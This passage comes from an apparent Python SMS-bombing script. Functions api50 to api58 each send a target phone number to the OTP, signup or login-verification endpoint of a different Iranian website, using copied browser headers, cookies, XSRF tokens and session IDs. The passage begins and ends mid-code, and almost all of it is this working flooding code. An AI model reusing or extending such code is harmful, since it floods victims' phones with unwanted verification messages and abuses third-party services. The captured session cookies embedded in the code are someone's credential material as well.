        # 'Cookie': 'XSRF-TOKEN=eyJpdiI6Iis5aGRIb2NiaFI4Ykp0Q1laQ05hRUE9PSIsInZhbHVlIjoiaXhTZWtHUVwvNWNTMDVZSVVHZWpqa1wvY3hPdmZTUHllUlkwY2d1SlVLSUhLSjBVWkhwbHkyTjMybHJiTGRRc09DIiwibWFjIjoiYTliMzE1ZjMyNjExYzdmMzZjMWI5MmQwYjljMmYzZWMxOTVjM2Q4OTVmMTc1ZWRjZWJiOGNhZmFiOTQ0ZWE4YiJ9; laravel_session=eyJpdiI6IlM0a1M4RkRSQUVLZExVWTdzdWZcL3Z3PT0iLCJ2YWx1ZSI6Ikc4bUxxQndZYjFtYnVURDdWZEx5YmRidk03NlwvUTcybXlBTCt4dGJGc2RSeDNWU3IzUDhGYUU2QmREWG9wZ3ZHIiwibWFjIjoiZjYxYzIwYjllNTllMTllMDJjOTY2NjA1Y2YyMDdjZDYxZTRkMTE0ZmI0YTk3ODMwYWNlMmY1NjhkZTU5YzcyOSJ9',
    }

    json_data = {
        'phone_number': number,
    }

    response = requests.post('http://anif.ir/api/v1/checkExistsUser', headers=headers, cookies=cookies, json=json_data,
                             verify=False)


def api50(number):
    headers = {
        'authority': 'api.behtarino.com',
        'user-id': 'undefined',
        'accept': 'application/json',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'sec-ch-ua-platform': '"Windows"',
        # Already added when you pass json=
        # 'content-type': 'application/json',
        'origin': 'https://behtarino.com',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://behtarino.com/',
        'accept-language': 'en-US,en;q=0.9',
    }

    json_data = {
        'phone': number,
    }

    response = requests.post('https://api.behtarino.com/api/v1/users/phone_verification/', headers=headers,
                             json=json_data)


def api51(number):
    cookies = {
        '_ga': 'GA1.2.596174241.1648727904',
        '_gid': 'GA1.2.426269640.1648727904',
        '_gat_gtag_UA_45085915_1': '1',
        'XSRF-TOKEN': 'eyJpdiI6Ikk1VHdJN1VxZ01SdDA4a3NtbWRUeWc9PSIsInZhbHVlIjoiekNNUG1hUDJmcGhZN0gxQm1TWVp3ZThQYU5yRDgzNGd3YW5UbkFwN0lmS01iaWhJYW5RNVlMcmRkZGZsTFpQUFwvU0xjZkRHVDFUdnp0cW92OE1jSjBUK3J5UXc4OUVOYmprR3kzbkRCN1lWaHBNaEFsZEZuUWhQUm01b2R0OHBUIiwibWFjIjoiYjkyNWEzMDIyNmM5ZGI1MDJmNWU5MGUwNGRkZWY0MjcyZWQ3YzYzOTAzODgyMjU4ZGMxZGUzYTY2MTI5NjBmMyJ9',
        'laravel_session': 'eyJpdiI6IjZxQkVONXFZMGFBanZhZTNcL0pjaVBnPT0iLCJ2YWx1ZSI6InJoekZwR2U2Q2tcL0Q5b05cL3NkY2h2ZHE1N0xNcnJlWG9vMXY3VnZpcVp1NUtuZHdvUWo5VnpmRTNCMlRGR2hOYkttQjZJUlo5QWVRRE1tckM2XC95YXdWWmRrWE1xVytWek55MGoxbzU4XC9BaXpPQTM1Q25MNm16STRHZ2NERlUrbCIsIm1hYyI6IjFlMjQ2YWE4NjgzNzYyNGRjMGRjYjhjODMzMDI3MTY3ZjJmMjYwZjIzYzRhYzRiYjFkMWRhMmE1NzdlNGY3ZjgifQ%3D%3D',
    }

    headers = {
        'authority': 'dast2.com',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'x-xsrf-token': 'eyJpdiI6Ikk1VHdJN1VxZ01SdDA4a3NtbWRUeWc9PSIsInZhbHVlIjoiekNNUG1hUDJmcGhZN0gxQm1TWVp3ZThQYU5yRDgzNGd3YW5UbkFwN0lmS01iaWhJYW5RNVlMcmRkZGZsTFpQUFwvU0xjZkRHVDFUdnp0cW92OE1jSjBUK3J5UXc4OUVOYmprR3kzbkRCN1lWaHBNaEFsZEZuUWhQUm01b2R0OHBUIiwibWFjIjoiYjkyNWEzMDIyNmM5ZGI1MDJmNWU5MGUwNGRkZWY0MjcyZWQ3YzYzOTAzODgyMjU4ZGMxZGUzYTY2MTI5NjBmMyJ9',
        'x-csrf-token': 'eb2EToSfPbKZ4ymwBtWCT7FH1jExqoUl3VNpqXf7',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36',
        'content-type': 'application/json;charset=UTF-8',
        'accept': 'application/json, text/plain, */*',
        'x-requested-with': 'XMLHttpRequest',
        'sec-ch-ua-platform': '"Windows"',
        'origin': 'https://dast2.com',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://dast2.com/login',
        'accept-language': 'en-US,en;q=0.9',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_ga=GA1.2.596174241.1648727904; _gid=GA1.2.426269640.1648727904; _gat_gtag_UA_45085915_1=1; XSRF-TOKEN=eyJpdiI6Ikk1VHdJN1VxZ01SdDA4a3NtbWRUeWc9PSIsInZhbHVlIjoiekNNUG1hUDJmcGhZN0gxQm1TWVp3ZThQYU5yRDgzNGd3YW5UbkFwN0lmS01iaWhJYW5RNVlMcmRkZGZsTFpQUFwvU0xjZkRHVDFUdnp0cW92OE1jSjBUK3J5UXc4OUVOYmprR3kzbkRCN1lWaHBNaEFsZEZuUWhQUm01b2R0OHBUIiwibWFjIjoiYjkyNWEzMDIyNmM5ZGI1MDJmNWU5MGUwNGRkZWY0MjcyZWQ3YzYzOTAzODgyMjU4ZGMxZGUzYTY2MTI5NjBmMyJ9; laravel_session=eyJpdiI6IjZxQkVONXFZMGFBanZhZTNcL0pjaVBnPT0iLCJ2YWx1ZSI6InJoekZwR2U2Q2tcL0Q5b05cL3NkY2h2ZHE1N0xNcnJlWG9vMXY3VnZpcVp1NUtuZHdvUWo5VnpmRTNCMlRGR2hOYkttQjZJUlo5QWVRRE1tckM2XC95YXdWWmRrWE1xVytWek55MGoxbzU4XC9BaXpPQTM1Q25MNm16STRHZ2NERlUrbCIsIm1hYyI6IjFlMjQ2YWE4NjgzNzYyNGRjMGRjYjhjODMzMDI3MTY3ZjJmMjYwZjIzYzRhYzRiYjFkMWRhMmE1NzdlNGY3ZjgifQ%3D%3D',
    }

    json_data = {
        'cellphone': number,
    }

    response = requests.post('https://dast2.com/token', headers=headers, cookies=cookies, json=json_data)


def api52(number):
    cookies = {
        '__RequestVerificationToken': 'y3ibVenm-rM1B-_JGx95fbEJQJq6SUBoNTUTnG0hHV8cJ28x8LKutE3pwpcqjPSwhIMi-xbkIm_ben0IAogcSL2Zyo97SN96hu3X3BexKd41',
        '_ga': 'GA1.2.2022012391.1648803327',
        '_gid': 'GA1.2.1299352298.1648803327',
    }

    headers = {
        'authority': 'www.mashadleather.com',
        'cache-control': 'max-age=0',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'upgrade-insecure-requests': '1',
        'origin': 'https://www.mashadleather.com',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'referer': 'https://www.mashadleather.com/Login?ReturnUrl=%2Fhistory',
        'accept-language': 'en-US,en;q=0.9',
        # Requests sorts cookies= alphabetically
        # 'cookie': '__RequestVerificationToken=y3ibVenm-rM1B-_JGx95fbEJQJq6SUBoNTUTnG0hHV8cJ28x8LKutE3pwpcqjPSwhIMi-xbkIm_ben0IAogcSL2Zyo97SN96hu3X3BexKd41; _ga=GA1.2.2022012391.1648803327; _gid=GA1.2.1299352298.1648803327',
    }

    params = {
        'returnUrl': '/history',
    }

    data = {
        '__RequestVerificationToken': 'Rut8AS8KbUyTaej0izb00lMg-sqizCAt0DQ53BDxpLJ3W022FtvhKGhjlvIjbPoBd_xm1J7-WWG3EIzx71CCRohot8xmzv6KAmmdk4bOBHo1',
        'CellNumber': number,
    }

    response = requests.post('https://www.mashadleather.com/Login', headers=headers, params=params, cookies=cookies,
                             data=data)


def api53(number):
    cookies = {
        'analytics_campaign': '{%22source%22:%22direct%22%2C%22medium%22:null}',
        '_gid': 'GA1.2.1501131300.1648803870',
        '_gat_gtag_UA_57199074_1': '1',
        '_gat_UA-57199074-6': '1',
        '_ga': 'GA1.1.1462659137.1648803870',
        'G_ENABLED_IDPS': 'google',
        '_ga_E5KGQWCMD3': 'GS1.1.1648803869.1.0.1648803877.0',
        '_ga_E1VQ34D215': 'GS1.1.1648803870.1.0.1648803877.0',
    }

    headers = {
        'Connection': 'keep-alive',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        # Already added when you pass json=
        # 'content-type': 'application/json',
        'sec-ch-ua-mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36',
        'session': 'undefined',
        'sec-ch-ua-platform': '"Windows"',
        'Accept': '*/*',
        'Origin': 'https://taaghche.com',
        'Sec-Fetch-Site': 'same-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://taaghche.com/',
        'Accept-Language': 'en-US,en;q=0.9',
        # Requests sorts cookies= alphabetically
        # 'Cookie': 'analytics_campaign={%22source%22:%22direct%22%2C%22medium%22:null}; _gid=GA1.2.1501131300.1648803870; _gat_gtag_UA_57199074_1=1; _gat_UA-57199074-6=1; _ga=GA1.1.1462659137.1648803870; G_ENABLED_IDPS=google; _ga_E5KGQWCMD3=GS1.1.1648803869.1.0.1648803877.0; _ga_E1VQ34D215=GS1.1.1648803870.1.0.1648803877.0',
    }

    json_data = {
        'contact': number,
    }

    response = requests.post('https://gw.taaghche.com/v4/site/auth/signup', headers=headers, cookies=cookies,
                             json=json_data)


def api54(number):
    headers = {
        'authority': 'api.behtarino.com',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'accept': 'application/json',
        'sec-ch-ua-mobile': '?0',
        'user-id': 'undefined',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        # Already added when you pass json=
        # 'content-type': 'application/json',
        'origin': 'https://behtarino.com',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://behtarino.com/',
        'accept-language': 'en-US,en;q=0.9',
    }

    json_data = {
        'phone': number,
    }

    response = requests.post('https://api.behtarino.com/api/v1/users/phone_verification/', headers=headers,
                             json=json_data)


def api55(number):
    cookies = {
        'PHPSESSID': 'jvbrfcd73hp86mu1i17111qu3hsr333d65gd6sgu59obqnm30vvf3ih5bgtu9ehg',
        '_uid_': '858da6b4256c7bc0d4fb9015f6573bbc',
        'tracker_glob_new': 'fxyj9Ou',
        'tracker_session': 'aPZpSfQ',
        'TS014b5e07': '0102310591d5ebb0c9ff6945c19f66a782df389d99d17306ab82b10ff73a07faf1e5bfdc1aaf8f1a471e99dfc63dc303fc65cfa006d826158911ed6e5bfbb0697cc92d319a00b383de979a249c3de829f05c045ba8be6a312d48f9c30e1ae461eaa0af94bbaa257613ec8d3436f1208e0c6ee6325d',
        'sn_tracker_campaign': '{"u_medium":"Direct","u_source":"Direct","u_campaign":"Direct","u_term":"Direct","u_content":"Direct"}',
        '_gid': 'GA1.2.1272028541.1648804087',
        '_gat_UA-83129158-1': '1',
        '__asc': '1140dbea17fe461c6994f4b4f42',
        '__auc': '1140dbea17fe461c6994f4b4f42',
        '_ga': 'GA1.1.774330250.1648804087',
        '_xpid': '3866274557',
        '_xpkey': 'k69hC7CEHeHH_b8LhjnCTp6wBiHV71mE',
        '_conv_v': 'vi%3A1*sc%3A1*cs%3A1648804089*fs%3A1648804089*pv%3A1',
        '_conv_s': 'si%3A1*sh%3A1648804089064-0.14345041879841114*pv%3A1',
        '_hjSessionUser_2775789': 'eyJpZCI6IjEyMzA2YzM5LTk5ZGEtNTM0NC1iYzRmLTIzMzAxOTRkOTNlYSIsImNyZWF0ZWQiOjE2NDg4MDQwODk1MjgsImV4aXN0aW5nIjpmYWxzZX0=',
        '_hjFirstSeen': '1',
        '_hjIncludedInSessionSample': '0',
        '_hjSession_2775789': 'eyJpZCI6ImVhNmU1ZWMyLTc3MGYtNGY4Mi04OTE0LTJhMzE4OTdjMjIyMSIsImNyZWF0ZWQiOjE2NDg4MDQwODk1NDMsImluU2FtcGxlIjpmYWxzZX0=',
        '_hjIncludedInPageviewSample': '1',
        '_hjAbsoluteSessionInProgress': '1',
        '_ga_84EMKEXT1M': 'GS1.1.1648804086.1.0.1648804094.52',
    }

    headers = {
        'authority': 'www.digistyle.com',
        'cache-control': 'max-age=0',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'upgrade-insecure-requests': '1',
        'origin': 'https://www.digistyle.com',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'referer': 'https://www.digistyle.com/users/login-register/',
        'accept-language': 'en-US,en;q=0.9',
        # Requests sorts cookies= alphabetically
        # 'cookie': 'PHPSESSID=jvbrfcd73hp86mu1i17111qu3hsr333d65gd6sgu59obqnm30vvf3ih5bgtu9ehg; _uid_=858da6b4256c7bc0d4fb9015f6573bbc; tracker_glob_new=fxyj9Ou; tracker_session=aPZpSfQ; TS014b5e07=0102310591d5ebb0c9ff6945c19f66a782df389d99d17306ab82b10ff73a07faf1e5bfdc1aaf8f1a471e99dfc63dc303fc65cfa006d826158911ed6e5bfbb0697cc92d319a00b383de979a249c3de829f05c045ba8be6a312d48f9c30e1ae461eaa0af94bbaa257613ec8d3436f1208e0c6ee6325d; sn_tracker_campaign={"u_medium":"Direct","u_source":"Direct","u_campaign":"Direct","u_term":"Direct","u_content":"Direct"}; _gid=GA1.2.1272028541.1648804087; _gat_UA-83129158-1=1; __asc=1140dbea17fe461c6994f4b4f42; __auc=1140dbea17fe461c6994f4b4f42; _ga=GA1.1.774330250.1648804087; _xpid=3866274557; _xpkey=k69hC7CEHeHH_b8LhjnCTp6wBiHV71mE; _conv_v=vi%3A1*sc%3A1*cs%3A1648804089*fs%3A1648804089*pv%3A1; _conv_s=si%3A1*sh%3A1648804089064-0.14345041879841114*pv%3A1; _hjSessionUser_2775789=eyJpZCI6IjEyMzA2YzM5LTk5ZGEtNTM0NC1iYzRmLTIzMzAxOTRkOTNlYSIsImNyZWF0ZWQiOjE2NDg4MDQwODk1MjgsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample=0; _hjSession_2775789=eyJpZCI6ImVhNmU1ZWMyLTc3MGYtNGY4Mi04OTE0LTJhMzE4OTdjMjIyMSIsImNyZWF0ZWQiOjE2NDg4MDQwODk1NDMsImluU2FtcGxlIjpmYWxzZX0=; _hjIncludedInPageviewSample=1; _hjAbsoluteSessionInProgress=1; _ga_84EMKEXT1M=GS1.1.1648804086.1.0.1648804094.52',
    }

    data = {
        'loginRegister[email_phone]': number,
    }

    response = requests.post('https://www.digistyle.com/users/login-register/', headers=headers, cookies=cookies,
                             data=data)


def api56(number):
    headers = {
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36',
        'Referer': 'https://okala.com/auth',
    }

    params = {
        'mobile': number,
    }

    response = requests.get('https://okala.com/auth', headers=headers, params=params)


def api57(number):
    headers = {
        'authority': 'api.timcheh.com',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'accept': 'application/json, text/plain, */*',
        'x-cart': 'null',
        'sec-ch-ua-mobile': '?0',
        'content-type': 'application/json;charset=UTF-8',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        'origin': 'https://timcheh.com',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://timcheh.com/',
        'accept-language': 'en-US,en;q=0.9',
    }

    json_data = {
        'mobile': number,
    }

    response = requests.post('https://api.timcheh.com/auth/otp/send', headers=headers, json=json_data)


def api58(number):
    cookies = {
        'ASP.NET_SessionId': 'dipoexwewjntfqnmgzun2ezp',
        '_ga': 'GA1.2.359540154.1648804326',
        '_gid': 'GA1.2.974006395.1648804326',
        '_gat_gtag_UA_36178016_1': '1',
        '_clck': '14czju1|1|f09|0',
        '_clsk': '1qridrv|1648804327887|1|1|d.clarity.ms/collect',
    }

    headers = {
        'authority': 'emalls.ir',
        'cache-control': 'max-age=0',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'upgrade-insecure-requests': '1',
        'origin': 'https://emalls.ir',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'referer': 'https://emalls.ir/registernew.aspx?type=mobile&step=1',
        'accept-language': 'en-US,en;q=0.9',
        # Requests sorts cookies= alphabetically
        # 'cookie': 'ASP.NET_SessionId=dipoexwewjntfqnmgzun2ezp; _ga=GA1.2.359540154.1648804326; _gid=GA1.2.974006395.1648804326; _gat_gtag_UA_36178016_1=1; _clck=14czju1|1|f09|0; _clsk=1qridrv|1648804327887|1|1|d.clarity.ms/collect',
    }

    params = {
        'type': 'mobile',
        'step': '1',
    }

    data = {
        '__EVENTTARGET': '',
        '__EVENTARGUMENT': '',
        '__VIEWSTATE': '/wEPDwUKLTUyNTA3Nzg0OA9kFgJmD2QWAgIDDxYCHgZhY3Rpb24FJC9yZWdpc3Rlcm5ldy5hc3B4P3R5cGU9bW9iaWxlJnN0ZXA9MRYcAgcPZBYMAgEPDxYCHgtOYXZpZ2F0ZVVybAUJL1Byb2ZpbGUvZGQCAw8PFgIfAQUQL0FkbWluL1Nob3AuYXNweGRkAgUPDxYCHwEFDS9NeVNob3BzLmFzcHhkZAIJDw8WAh8BBR0v2YXYrdi12YjZhNin2Kp+dHlwZX5sYXN0c2VlbmRkAgsPDxYCHwEFHS/Zhdit2LXZiNmE2KfYqn50eXBlfnVzZXJsaXN0ZGQCDw8PFgIfAQUKL1JlZ2lzdGVyL2RkAgwPZBYQAgEPZBYCAgEPDxYCHgRUZXh0BRjZiNix2YjYryAvINir2KjYqiDZhtin2YVkZAIED2QWAgIBDw8WAh8BBQovUmVnaXN0ZXIvZGQCBQ8WAh4HVmlzaWJsZWgWAgIBDw8WAh8BBQkvUHJvZmlsZS9kZAIGDxYCHwNoFgICAQ8PFgQfAQUdL9mF2K3YtdmI2YTYp9iqfnR5cGV+bGFzdHNlZW4fA2hkZAIHD2QWAgIBDw8WBB8BBR0v2YXYrdi12YjZhNin2Kp+dHlwZX51c2VybGlzdB8DaGRkAggPFgIfA2gWAgIBDw8WAh8BBRAvQWRtaW4vU2hvcC5hc3B4ZGQCCQ8WAh8DaGQCCw8WAh8DaGQCEg8WAh4JaW5uZXJodG1sBYbdATx1bCBjbGFzcz0nZGVza3RvcG1lbnUtbDEnPjxsaSBjbGFzcz0nZGVza3RvcG1lbnUtbDEtaXRlbSc+PGEgaHJlZj0nL9mF2K3YtdmI2YTYp9iqfkNhdGVnb3J5fjMxNDE2JyAgPtqv2YjYtNuMINmF2YjYqNin24zZhCDZiCDYqtio2YTYqjwvYT48c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjE2IiBoZWlnaHQ9IjE2IiBmaWxsPSJjdXJyZW50Q29sb3IiIGNsYXNzPSJiaSBiaS1jaGV2cm9uLWRvd24iIHZpZXdCb3g9IjAgMCAxNiAxNiI+PHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBkPSJNMS42NDYgNC42NDZhLjUuNSAwIDAgMSAuNzA4IDBMOCAxMC4yOTNsNS42NDYtNS42NDdhLjUuNSAwIDAgMSAuNzA4LjcwOGwtNiA2YS41LjUgMCAwIDEtLjcwOCAwbC02LTZhLjUuNSAwIDAgMSAwLS43MDh6Ii8+PC9zdmc+PHVsIGNsYXNzPSdkZXNrdG9wbWVudS1sMiBib3hzaGFkb3cnICBzdHlsZT0nZGlzcGxheTogbm9uZSc+PGxpIGRhdGEtaWQ9JzM5Jz48YSBocmVmPScv2YXYrdi12YjZhNin2Kp+Q2F0ZWdvcnl+MzknICBjbGFzcz0nZGVza3RvcG1lbnUtbDItaXRlbScgPtqv2YjYtNuMINmF2YjYqNin24zZhDwvYT4gPHVsIGNsYXNzPSdkZXNrdG9wbWVudS1sMyBib3hzaGFkb3cnPjwvdWw+PC9saT48bGkgZGF0YS1pZD0nNDEnPjxhIGhyZWY9Jy/Zhdit2LXZiNmE2KfYqn5DYXRlZ29yeX40MScgIGNsYXNzPSdkZXNrdG9wbWVudS1sMi1pdGVtJyA+2KrYqNmE2Ko8L2E+IDx1bCBjbGFzcz0nZGVza3RvcG1lbnUtbDMgYm94c2hhZG93Jz48L3VsPjwvbGk+PGxpIGRhdGEtaWQ9JzIxNjAnPjxhIGhyZWY9Jy/Zhdit2LXZiNmE2KfYqn5DYXRlZ29yeX4yMTYwJyAgY2xhc3M9J2Rlc2t0b3BtZW51LWwyLWl0ZW0nID7aqdiq2KfYqCDYrtmI2KfZhjwvYT4gPHVsIGNsYXNzPSdkZXNrdG9wbWVudS1sMyBib3hzaGFkb3cnPjwvdWw+PC9saT48bGkgZGF0YS1pZD0nMTgwJz48YSBocmVmPScv2YXYrdi12YjZhNin2Kp+Q2F0ZWdvcnl+MTgwJyAgY2xhc3M9J2Rlc2t0b3BtZW51LWwyLWl0ZW0nID7Zh9iv2LPYqiDZiCDZh9iv2YHZiNmGPC9hPiA8dWwgY2xhc3M9J2Rlc2t0b3BtZW51LWwzIGJveHNoYWRvdyc+PC91bD48L2xpPjxsaSBkYXRhLWlkPScxNzknPjxhIGhyZWY9Jy/Zhdit2LXZiNmE2KfYqn5DYXRlZ29yeX4xNzknICBjbGFzcz0nZGVza3RvcG1lbnUtbDItaXRlbScgPkdQUzwvYT4gPHVsIGNsYXNzPSdkZXNrdG9wbWVudS1sMyBib3hzaGFkb3cnPjwvdWw+PC9saT48bGkgZGF0YS1pZD0nMTgyJz48YSBocmVmPScv2YXYrdi12YjZhNin2Kp+Q2F0ZWdvcnl+MTgyJyAgY2xhc3M9J2Rlc2t0b3BtZW51LWwyLWl0ZW0nID7Ys9uM2YUg2qnYp9ix2Ko8L2E+IDx1bCBjbGFzcz0nZGVza3RvcG1lbnUtbDMgYm94c2hhZG93Jz48L3VsPjwvbGk+PGxpIGRhdGEtaWQ9JzU4OSc+PGEgaHJlZj0nL9mF2K3YtdmI2YTYp9iqfkNhdGVnb3J5fjU4OScgIGNsYXNzPSdkZXNrdG9wbWVudS1sMi1pdGVtJyA+2YTZiNin2LLZhSDYrNin2YbYqNuMINmF2YjYqNin24zZhCDZiCDYqtio2YTYqjwvYT4gPHVsIGNsYXNzPSdkZXNrdG9wbWVudS1sMyBib3hzaGFkb3cnPjwvdWw+PC9saT48L3VsPjwvbGk+PGxpIGNsYXNzPSdkZXNrdG9wbWVudS1sMS1pdGVtJz48YSBocmVmPScv2YXYrdi12YjZhNin2Kp+Q2F0ZWdvcnl+OTg0NScgID7ZhNm+INiq2KfZviDZiCDaqdin2YXZvtuM2YjYqtixIDwvYT48c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjE2IiBoZWlnaHQ9IjE2IiBmaWxsPSJjdXJyZW50Q29sb3IiIGNsYXNzPSJiaSBiaS1jaGV2cm9uLWRvd24iIHZpZXdCb3g9IjAgMCAxNiAxNiI+PHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBkPSJNMS42NDYgNC42NDZhLjUuNSAwIDAgMSAuNzA4IDBMOCAxMC4yOTNsNS42NDYtNS42NDdhLjUuNSAwIDAgMSAuNzA4LjcwOGwtNiA2YS41LjUgMCAwIDEtLjcwOCAwbC02LTZhLjUuNSAwIDAgMSAwLS43MDh6Ii8+PC9zdmc+PHVsIGNsYXNzPSdkZXNrdG9wbWVudS1sMiBib3hzaGFkb3cnICBzdHlsZT0nZGlzcGxheTogbm9uZSc+PGxpIGRhdGEtaWQ9JzE1MTExNSc+PGEgaHJlZj0nL9mF2K3YtdmI2YTYp9iqfkNhdGVnb3J5fjE1MTExNScgIGNsYXNzPSdkZXNrdG9wbWVudS1sMi1pdGVtJyA+2qnbjNmBINm+2YjZhCDYs9iu2Kog2KfZgdiy2KfYsduMPC9hPiA8dWwgY2xhc3M9J2Rlc2t0b3BtZW51LWwzIGJveHNoYWRvdyc+PC91bD48L2xpPjxsaSBkYXRhLWlkPSc0MCc+PGEgaHJlZj0nL9mF2K3YtdmI2YTYp9iqfkNhdGVnb3J5fjQwJyAgY2xhc3M9J2Rlc2t0b3BtZW51LWwyLWl0ZW0nID7ZhNm+INiq2KfZvjwvYT4gPHVsIGNsYXNzPSdkZXNrdG9wbWVudS1sMyBib3hzaGFkb3cnPjwvdWw+PC9saT48bGkgZGF0YS1pZD0nMzE2Jz48YSBocmVmPScv2YXYrdi12YjZhNin2Kp+Q2F0ZWdvcnl+MzE2JyAgY2xhc3M9J2Rlc2t0b3BtZW51LWwyLWl0ZW0nID7aqdin2YXZvtuM2YjYqtixPC9hPiA8dWwgY2xhc3M9J2Rlc2t0b3BtZW51LWwzIGJveHNoYWRvdyc+PC91bD48L2xpPjxsaSBkYXRhLWlkPScyMDknPjxhIGhyZWY9Jy/Zhdit2LXZiNmE2KfYqn5DYXRlZ29yeX4yMDknICBjbGFzcz0nZGVza3RvcG1lbnUtbDItaXRlbScgPtiq2KzZh9uM2LLYp9iqINi02KjaqdmHPC9hPiA8dWwgY2xhc3M9J2Rlc2t0b3BtZW51LWwzIGJveHNoYWRvdyc+PC91bD48L2xpPjxsaSBkYXRhLWlkPScyMDc5Jz48YSBocmVmPScv2YXYrdi12YjZhNin2Kp+Q2F0ZWdvcnl+MjA3OScgIGNsYXNzPSdkZXNrdG9wbWVudS1sMi1pdGVtJyA+2KrYrNmH24zYstin2Kog2KfYr9in2LHbjCA8L2E+IDx1bCBjbGFzcz0nZGVza3RvcG1lbnUtbDMgYm94c2hhZG93Jz48L3VsPjwvbGk+PGxpIGRhdGEtaWQ9JzMxNDE3Jz48YSBocmVmPScv2YXYrdi12YjZhNin2Kp+Q2F0ZWdvcnl+MzE0MTcnICBjbGFzcz0nZGVza3RvcG1lbnUtbDItaXRlbScgPtiq2KzZh9uM2LLYp9iqINiw2K7bjNix2YfigIzYs9in2LLbjCA8L2E+IDx1bCBjbGFzcz0nZGVza3RvcG1lbnUtbDMgYm94c2hhZG93Jz48L3VsPjwvbGk+PGxpIGRhdGEtaWQ9JzU4OCc+PGEgaHJlZj0nL9mF2K3YtdmI2YTYp9iqfkNhdGVnb3J5fjU4OCcgIGNsYXNzPSdkZXNrdG9wbWVudS1sMi1pdGVtJyA+2YTZiNin2LLZhSDYrNin2YbYqNuMINmE2b4g2KrYp9m+INmIINqp2KfZhdm+24zZiNiq2LE8L2E+IDx1bCBjbGFzcz0nZGVza3RvcG1lbnUtbDMgYm94c2hhZG93Jz48L3VsPjwvbGk+PGxpIGRhdGEtaWQ9Jzc4NzEwJz48YSBocmVmPScv2YXYrdi12YjZhNin2Kp+Q2F0ZWdvcnl+Nzg3MTAnICBjbGFzcz0nZGVza3RvcG1lbnUtbDItaXRlbScgPtiv2LPYqtqv2KfZhyDZhdin24zZhtuM2Y